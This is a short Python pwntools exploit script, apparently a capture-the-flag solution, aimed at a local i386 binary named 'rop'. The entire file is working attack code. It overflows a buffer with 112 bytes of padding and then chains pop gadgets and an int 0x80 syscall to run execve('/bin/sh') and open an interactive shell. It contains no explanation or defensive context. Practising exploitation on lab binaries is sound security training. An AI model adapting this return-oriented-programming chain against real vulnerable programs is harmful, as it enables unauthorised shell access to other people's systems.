from pwn import *
context.arch = "i386"
context.log_level = "debug"
context.terminal = ["tmux","splitw","-h"]
p = process("./rop")
e = ELF("./rop")
rop = ROP(e)
pop_eax = rop.eax[0]
pop_ebx = rop.ebx[0]
pop_ecx = rop.ecx[0]
pop_edx = rop.edx[0]

print hex(pop_edx)

'''
0x0806ee09 : pop ebx ; pop edx ; ret
'''
pp_bd = 0x0806ee09

int80 = 0x0806ca85
bin_sh = e.search("/bin/sh").next()
p1 = flat(["A"*112,pop_eax,11,pp_bd,bin_sh,0,pop_ecx,0,int80])
# execve("/bin/sh",0,0)
#gdb.attach(p)
p.sendline(p1)

p.interactive()
